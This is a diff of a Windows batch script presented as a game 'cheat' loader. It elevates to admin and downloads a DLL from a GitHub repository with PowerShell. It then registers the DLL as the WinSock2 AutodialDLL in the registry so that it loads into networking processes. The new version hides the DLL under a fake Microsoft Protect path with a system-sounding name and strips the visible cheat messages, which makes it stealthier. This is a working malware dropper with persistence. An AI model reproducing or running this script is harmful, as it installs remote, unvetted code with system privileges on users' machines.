@@ -1,10 +1,4 @@
 @echo off
-setlocal enabledelayedexpansion
-
-:: Set console text color to green (Dark Green: 02, Bright Green: 0A)
-color 0A
-
-:: Check for administrative privileges
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     echo This script requires administrative privileges. Restarting with admin rights...
@@ -12,37 +6,22 @@ if %errorLevel% neq 0 (
     exit /b
 )
 
-:: Display header
-echo.
-echo  ==============================
-echo  =        [32m64TH Service[0m        =
-echo  ==============================
-echo.
+cd /d "%~dp0"
 
-REM --> Set variables
-set "tempFolder=%temp%\64THService"
+:: Download the DLL from GitHub
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/64file911/freecheat/raw/refs/heads/main/MSTTSEngine.dll', 'C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\MSTTSEngine.dll')"
 
-REM --> Create the temp folder only if it does not already exist
-if not exist "%tempFolder%" (
-    mkdir "%tempFolder%"
+:: Check if download was successful
+if %errorLevel% neq 0 (
+    echo Failed to download the DLL file.
+    exit /b
 )
 
-cd "%tempFolder%"
+:: Move the downloaded DLL to C:\Windows\
+move /Y "C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\MSTTSEngine.dll" "C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\"
 
-:: Download required files
-echo.
-echo [32mLoading...[0m
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/64file911/freecheat/raw/refs/heads/main/pyshellextamd64.dll' -OutFile '%tempFolder%\pyshellextamd64.dll'" >nul 2>&1
+:: Update the registry entry
+reg add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /t REG_SZ /v AutodialDLL /d "C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\MSTTSEngine.dll" /F
 
-:: Move the downloaded file to the final destination and modify registry
-echo.
-echo [32mInjecting cheat...[0m
-timeout /t 5 >nul
-move /Y "%tempFolder%\pyshellextamd64.dll" "C:\Windows\" >nul 2>&1
-reg add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /t REG_SZ /v AutodialDLL /d "%systemroot%\pyshellextamd64.dll" /F >nul 2>&1
-
-echo.
-echo [32mOperation completed successfully.[0m
-
-:: Automatically close the batch file after the operation completes
+:: Exit without pause
 exit
